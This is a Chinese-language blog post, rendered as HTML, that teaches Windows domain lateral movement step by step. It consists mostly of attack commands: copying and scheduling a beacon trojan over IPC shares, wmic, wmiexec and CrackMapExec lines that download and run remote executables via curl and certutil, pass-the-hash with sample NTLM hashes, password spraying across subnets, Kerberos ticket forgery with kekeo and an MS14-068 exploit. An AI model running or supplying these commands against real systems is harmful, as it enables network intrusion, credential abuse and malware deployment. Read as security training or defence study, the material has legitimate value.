@@ -1,0 +1,805 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="admin">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Windows通过前期的信息收集到的账号密码或者通过漏洞进行横向移动，横行移动的首要目标是DC，拿下DC就相当于拿下所有的主机 PTH（hash传递）IPC横向:::info IPC (Internet Process Connection) 共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC 可以通过验证用户名和密码获得相应的权限，使用 139、445 端口。  利用条件： 1、目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="横向移动">
+<meta property="og:url" content="https://ytcenter.github.io/2024/06/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="YangTu">
+<meta property="og:description" content="Windows通过前期的信息收集到的账号密码或者通过漏洞进行横向移动，横行移动的首要目标是DC，拿下DC就相当于拿下所有的主机 PTH（hash传递）IPC横向:::info IPC (Internet Process Connection) 共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC 可以通过验证用户名和密码获得相应的权限，使用 139、445 端口。  利用条件： 1、目">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-06-05T12:11:53.000Z">
+<meta property="article:modified_time" content="2025-02-07T11:32:07.195Z">
+<meta property="article:author" content="admin">
+<meta property="article:tag" content="内网安全">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>横向移动 - YangTu</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ytcenter.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>YangTu_Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="横向移动"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-05 20:11" pubdate>
+          2024年6月5日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">横向移动</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>通过前期的信息收集到的账号密码或者通过漏洞进行横向移动，横行移动的首要目标是DC，拿下DC就相当于拿下所有的主机</p>
+<h2 id="PTH（hash传递）"><a href="#PTH（hash传递）" class="headerlink" title="PTH（hash传递）"></a>PTH（hash传递）</h2><h3 id="IPC横向"><a href="#IPC横向" class="headerlink" title="IPC横向"></a><strong>IPC横向</strong></h3><p>:::info</p>
+<h4 id="IPC-Internet-Process-Connection-共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC-可以通过验证用户名和密码获得相应的权限，使用-139、445-端口。"><a href="#IPC-Internet-Process-Connection-共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC-可以通过验证用户名和密码获得相应的权限，使用-139、445-端口。" class="headerlink" title="IPC (Internet Process Connection) 共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC 可以通过验证用户名和密码获得相应的权限，使用 139、445 端口。 "></a><font style="color:rgb(68, 68, 68);">IPC (Internet Process Connection) 共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC 可以通过验证用户名和密码获得相应的权限，使用 139、445 端口。 </font></h4><p><font style="color:rgb(68, 68, 68);"></font></p>
+<p><font style="color:rgb(68, 68, 68);">利用条件：</font></p>
+<p><font style="color:rgb(68, 68, 68);">1、目标机开启了139和445端口； </font></p>
+<p><font style="color:rgb(68, 68, 68);">2、目标主机管理员开启了ipc$默认共享；</font></p>
+<p><font style="color:rgb(68, 68, 68);">3、知道目标机的账户密码。</font></p>
+<p>:::</p>
+<h4 id="1-1-net-use"><a href="#1-1-net-use" class="headerlink" title="1.1  net use"></a>1.1  net use</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell">建立连接<br>net use \\<span class="hljs-number">192.168</span>.<span class="hljs-number">3.73</span>\ipc<span class="hljs-variable">$</span> <span class="hljs-string">&quot;123456&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br><br>查看连接情况<br>net use<br><br>拷贝木马到目标主机c盘<br><span class="hljs-built_in">copy</span> beacon.exe \\<span class="hljs-number">192.168</span>.<span class="hljs-number">3.73</span>\c<span class="hljs-variable">$</span><br><br>使用at命令创建计划任务(at&lt;<span class="hljs-number">2012</span>)：<br>at \\<span class="hljs-number">192.168</span>.<span class="hljs-number">3.73</span> <span class="hljs-number">15</span>:<span class="hljs-number">47</span> c:\beacon.exe<br><br>使用schtasks命令创建计划任务（schtasks&gt;=<span class="hljs-number">2012</span>）<br>创建计划任务<br>schtasks /create /s xxx.tyad.cn /tn sysname /<span class="hljs-built_in">sc</span> once /st <span class="hljs-number">18</span>:<span class="hljs-number">00</span> /sd <span class="hljs-number">2024</span>/<span class="hljs-number">12</span>/<span class="hljs-number">29</span> /F /ru administrator /tr <span class="hljs-string">&quot;c:/windows/system32/calc.exe&quot;</span><br>执行计划任务<br>schtasks /run /tn sysname /s xxx.tyad.cn<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="1-2-atexec（impacket-工具）"><a href="#1-2-atexec（impacket-工具）" class="headerlink" title="1.2 atexec（impacket 工具）"></a>1.2 atexec（<strong><font style="color:rgb(68, 68, 68);">impacket 工具</font></strong>）</h4><p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/">impacket&#x2F;examples at master · fortra&#x2F;impacket</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br>使用域用户对主机横向移动<br>python atexec.py god/administrator:password@<span class="hljs-number">192.168</span>.<span class="hljs-number">0.11</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>使用本地用户对主机横向移动<br>python atexec.py ./administrator:password@<span class="hljs-number">192.168</span>.<span class="hljs-number">0.11</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>使用hash的的方式横向<br>python atexec.py  <span class="hljs-literal">-hashes</span> :<span class="hljs-number">36</span>ec9d73422e1bf53b84fdb16a8e4198 god/administrator@<span class="hljs-number">192.168</span>.<span class="hljs-number">0.11</span> <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="WMI横向"><a href="#WMI横向" class="headerlink" title="WMI横向"></a>WMI横向</h3><p>:::info<br><font style="color:rgb(68, 68, 68);">WMI （Windows Mannagement Instrumentation）全称 “windows 管理规范”，从 win2003 开始一直存在。它原本的作用是方便管理员对 windows 主机进行管理。</font></p>
+<p><font style="color:rgb(68, 68, 68);">使用</font><font style="color:rgb(68, 68, 68);"> </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);&quot;&gt;wmic&lt;/font&gt;</code><font style="color:rgb(68, 68, 68);"> </font><font style="color:rgb(68, 68, 68);">远程执行命令，在远程系统中启动</font><font style="color:rgb(68, 68, 68);"> </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);&quot;&gt;Windows Mannagement Instrumentation&lt;/font&gt;</code><font style="color:rgb(68, 68, 68);"> </font><font style="color:rgb(68, 68, 68);">服务（目标服务器需要开放 135 端口，wmic 会以管理员权限在远程系统中执行命令）</font></p>
+<p><font style="color:rgb(68, 68, 68);">Windows操作系统默认不会将WMI的操作记录到日志当中，而且因为采用的是无文件攻击，所以导致WMI具有极高的隐蔽性。</font></p>
+<p><font style="color:rgb(68, 68, 68);"></font></p>
+<p><font style="color:rgb(68, 68, 68);">利用条件：</font></p>
+<p><font style="color:rgb(68, 68, 68);">1、WMI服务开启，端口135，默认开启。 </font></p>
+<p><font style="color:rgb(68, 68, 68);">2、防火墙允许135、445等端口通信。 </font></p>
+<p><font style="color:rgb(68, 68, 68);">3、知道目标机的账户密码。</font></p>
+<p>:::</p>
+<h4 id="2-1-wmic"><a href="#2-1-wmic" class="headerlink" title="2.1 wmic"></a>2.1 wmic</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic /node:<span class="hljs-number">191.168</span>.<span class="hljs-number">52.136</span> /user:xxxx /password:xxxxx  <span class="hljs-keyword">process</span> call create <span class="hljs-string">&quot;cmd.exe /c curl -O http://192.168.88.8/shell.exe&quot;</span><br>wmic /node:<span class="hljs-number">191.168</span>.<span class="hljs-number">52.136</span> /user:xxxx /password:xxxxx  <span class="hljs-keyword">process</span> call create <span class="hljs-string">&quot;cmd.exe /c shell.exe&quot;</span><br>无需上传第三方软件，系统自带命令。单命令执行，执行后不会有回显<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-2-cscript"><a href="#2-2-cscript" class="headerlink" title="2.2 cscript"></a>2.2 cscript</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cscript //nologo wmiexec.vbs /shell <span class="hljs-number">191.168</span>.<span class="hljs-number">52.136</span>  <br>需上传wmiexec.vbs然后进入该服务器内进行执行，该命令是交互式的模式，建议在本地使用代理执行<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-3-wmiexec-impacket-工具"><a href="#2-3-wmiexec-impacket-工具" class="headerlink" title="2.3 wmiexec(impacket 工具)"></a>2.3 <strong><font style="color:rgb(68, 68, 68);">wmiexec(impacket 工具)</font></strong></h4><ul>
+<li>工具地址：<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py">https://github.com/fortra/impacket/blob/master/examples/wmiexec.py</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">1</span>.执行命令下载木马（./表示本地用户，域用户使用rookin.org/administrator）<br>python wmiexec.py ./administrator:password@<span class="hljs-number">192.168</span>.<span class="hljs-number">52.136</span> <span class="hljs-string">&quot;cmd.exe /c certutil -urlcache -split -f   http://192.168.52.137:8090/wmi.exe C:\wmi.exe&quot;</span><br><br><span class="hljs-number">2</span>.用hash的方式：<br>python wmiexec.py <span class="hljs-literal">-hashes</span> :<span class="hljs-number">36</span>ec9d73422e1bf53b84fdb16a8e4198 ./qaxnb@<span class="hljs-number">192.168</span>.<span class="hljs-number">52.136</span> <span class="hljs-string">&quot;whoami&quot;</span><br>第三方软件 (交互式&amp;单执行)，容易被杀<br></code></pre></td></tr></table></figure>
+
+<h3 id="SMB-横向"><a href="#SMB-横向" class="headerlink" title="SMB 横向"></a><strong><font style="color:rgb(68, 68, 68);">SMB 横向</font></strong></h3><p>:::info<br><font style="color:rgb(68, 68, 68);">利用 SMB 服务可以通过明文或 hash 传递来远程执行。</font></p>
+<p><font style="color:rgb(68, 68, 68);"></font></p>
+<p><font style="color:rgb(68, 68, 68);">利用条件：</font></p>
+<p><font style="color:rgb(68, 68, 68);">1、445端口开放</font></p>
+<p><font style="color:rgb(68, 68, 68);">2、知道账号密码</font></p>
+<p>:::</p>
+<h4 id="3-1-psexec（微软官方工具）"><a href="#3-1-psexec（微软官方工具）" class="headerlink" title="3.1 psexec（微软官方工具）"></a>3.1 <strong><font style="color:rgb(68, 68, 68);">psexec（微软官方工具）</font></strong></h4><ul>
+<li><p>PsExec的使用不需要对方主机开启3389端口，只需要对方开启admin$共享 (该共享默认开启)。假如目标主机开启了防火墙，PsExec 会提示找不到网络路径。</p>
+</li>
+<li><p>目标机上开启了admin$共享，且未开启防火墙，导致跳板机可以与目标机建立ipc$连接，</p>
+<pre><code class="hljs">同时释放二进制文件psexecsvc.exe到目标机中，然后在跳板机上通过执行运行PsExec，会为目标机远程创    建一个PsExec服务并启动，接下来攻击者只需在跳板机上利用PsExec的远程命令构造一个交互shell即可实现横向移动。
+</code></pre>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">psexec使用的是交互式，建议在本地使用代理运行，优点：微软官方不会被杀<br>PsExec64.exe \\<span class="hljs-number">192.168</span>.<span class="hljs-number">52.136</span> <span class="hljs-literal">-u</span> &lt;username&gt; <span class="hljs-literal">-p</span> &lt;password&gt; <span class="hljs-literal">-s</span> cmd<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-2-psexec（impacket-工具）"><a href="#3-2-psexec（impacket-工具）" class="headerlink" title="3.2 psexec（impacket 工具）"></a><strong><font style="color:rgb(68, 68, 68);">3.2 psexec（impacket 工具）</font></strong></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">支持hash传递,支持非交互式<br><br>python psexec.py <span class="hljs-literal">-hashes</span> :<span class="hljs-number">36</span>ec9d73422e1bf53b84fdb16a8e4198 ./qaxnb@<span class="hljs-number">192.168</span>.<span class="hljs-number">52.136</span> <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="3-3-smbexe（impacket-工具）"><a href="#3-3-smbexe（impacket-工具）" class="headerlink" title="3.3 smbexe（impacket 工具）"></a>3.3 <strong><font style="color:rgb(68, 68, 68);">smbexe（impacket 工具）</font></strong></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">交互式shell<br>python smbexec.py ./:@<span class="hljs-number">192.168</span>.<span class="hljs-number">52.136</span><br>非交互式shell<br>python smbexec.py ./:@<span class="hljs-number">192.168</span>.<span class="hljs-number">52.136</span> <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="密码喷射工具CrackMapExec"><a href="#密码喷射工具CrackMapExec" class="headerlink" title="密码喷射工具CrackMapExec"></a><font style="color:rgb(79, 79, 79);">密码喷射工具CrackMapExec</font></h3><p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec/releases/tag/v5.4.0">Release 5.4.0 - Indestructible G0thm0g · byt3bl33d3r&#x2F;CrackMapExec</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell">对<span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span><span class="hljs-literal">-32</span>网段的域用户的smb协议进行密码喷射<br>proxychains crackmapexec smb <span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span><span class="hljs-literal">-32</span> <span class="hljs-literal">-u</span> administrator <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;admin!@#45&#x27;</span><br><br>对<span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span><span class="hljs-literal">-32</span>网段的本地用户的smb协议进行密码喷射（<span class="hljs-literal">--local-auth</span>参数表示本地用户）<br>proxychains crackmapexec smb <span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span><span class="hljs-literal">-32</span> <span class="hljs-literal">-u</span> administrator <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;admin!@#45&#x27;</span> <span class="hljs-literal">--local-auth</span><br><br><br>对<span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span><span class="hljs-literal">-32</span>网段的域用户的smb协议进行密码喷射并执行命令上线cs（<span class="hljs-literal">-x</span> 参数执行命令）<br>proxychains crackmapexec smb <span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span><span class="hljs-literal">-32</span> <span class="hljs-literal">-u</span> administrator <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;admin!@#45&#x27;</span> <span class="hljs-literal">-x</span> <span class="hljs-string">&quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/webserver4444.exe c:/webserver4444.exe &amp; c:/webserver4444.exe&quot;</span><br><br><br>对<span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span><span class="hljs-literal">-32</span>网段的域用户的smb协议进行密码喷射并执行命令上线cs（<span class="hljs-literal">-H</span> 使用hash进行喷射）<br>proxychains crackmapexec smb <span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span><span class="hljs-literal">-32</span> <span class="hljs-literal">-u</span> administrator <span class="hljs-literal">-H</span> <span class="hljs-string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span> <span class="hljs-literal">-x</span> <span class="hljs-string">&#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/webserver4444.exe c:/webserver4444.exe &amp; c:/webserver4444.exe&#x27;</span><br><br><br><br>真实情况下肯定是不清楚那些凭证以及密码可以使用，所以放入文件中，两两组合。<br>对<span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span><span class="hljs-literal">-32</span>网段的域用户的smb协议进行密码喷射，（<span class="hljs-literal">-u</span> 用户字典、<span class="hljs-literal">-p</span> 密码字典、<span class="hljs-literal">-H</span> hash字典）<br>proxychains crackmapexec smb <span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span><span class="hljs-literal">-32</span> <span class="hljs-literal">-u</span> user.txt <span class="hljs-literal">-p</span> pass.txt <span class="hljs-literal">-x</span> <span class="hljs-string">&#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/webserver4444.exe c:/webserver4444.exe &amp; c:/webserver4444.exe&#x27;</span> <span class="hljs-literal">--local-auth</span><br><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="PTT（票据传递）"><a href="#PTT（票据传递）" class="headerlink" title="PTT（票据传递）"></a>PTT（票据传递）</h2><p>klist 查看票据</p>
+<p>klist purge 删除票据</p>
+<h5 id="使用kekeo工具-票据伪造"><a href="#使用kekeo工具-票据伪造" class="headerlink" title="使用kekeo工具(票据伪造)"></a>使用kekeo工具(票据伪造)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">生成票据<br>kekeo &quot;tgt::ask /user:jerry /domain:rootkit.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot; &quot;exit&quot;<br>导入票据<br>kekeo &quot;kerberos::ptt TGT_administrator@ROOTKIT.ORG_krbtgt~rootkit.org@ROOTKIT.ORG.kirbi&quot; &quot;exit&quot;<br><br>dir \\dc.ytad.cn\c$<br>copy将木马复制到目标上<br>使用schetaks远程创建定时任务和远程执行定时任务<br></code></pre></td></tr></table></figure>
+
+<h5 id="漏洞攻击模式-ms14-068"><a href="#漏洞攻击模式-ms14-068" class="headerlink" title="漏洞攻击模式-ms14-068"></a>漏洞攻击模式-ms14-068</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">whoami /user 获取sid值<br>MS14-068.exe -u micle@rootkit.org -p Admin1234 -s S-1-5-21-3759881954-2993291187-3577547808-1139 -d 192.168.3.144<br></code></pre></td></tr></table></figure>
+
+<h5 id="mimikatz（票据劫持-高权限）"><a href="#mimikatz（票据劫持-高权限）" class="headerlink" title="mimikatz（票据劫持-高权限）"></a>mimikatz（票据劫持-高权限）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">使用mimikatz工具导出内存中的票据,然后重新导入利用-票据劫持<br></code></pre></td></tr></table></figure>
+
+<h5 id="rubeus"><a href="#rubeus" class="headerlink" title="rubeus"></a>rubeus</h5><p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+<p>检测内网存在rc4加密的协议的服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">rubeus kerberoast 检查是否有攻击条件<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><h4 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h4><p>委派是一种域内应用模式，是指将域内用户账户委派给服务账号，服务账户因此能以用户的身份在域内活动（请求新的服务）</p>
+<ul>
+<li>域委派分类：</li>
+</ul>
+<p>非约束性委派（UD）</p>
+<p>约束性委派（CD）</p>
+<p>基于资源的约束委派（RBCD）</p>
+<ul>
+<li>账户分类</li>
+</ul>
+<p>机器账户：	计算机本身名称的账户，在域中computers组中</p>
+<p>主机账户：计算机系统的主机账户，常用于登陆计算机使用，常在域中的users组中</p>
+<p>服务账户：计算机安装服务时候创建的账户，用于运行服务，不可登陆计算机</p>
+<h4 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a><font style="color:rgb(79, 79, 79);">非约束性委派</font></h4><p>Adfind工具：<a target="_blank" rel="noopener" href="https://github.com/mai-lang-chai/AD-Penetration-Testing-Tools/tree/master">https://github.com/mai-lang-chai/AD-Penetration-Testing-Tools/tree/master</a></p>
+<ul>
+<li>查询域中所有计算机账户</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -f &quot;objectcategory=computer&quot;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgba(0, 0, 0, 0.75);">查询域中配置非约束性委派的机器账户</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -f &quot;(&amp;(objectcategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgba(0, 0, 0, 0.75);">查询域中配置非约束性委派的用户账户</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -f &quot;(&amp;(objectcategory=person)(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgba(0, 0, 0, 0.75);">查询域中配置非约束性委派的服务账户</font></li>
+</ul>
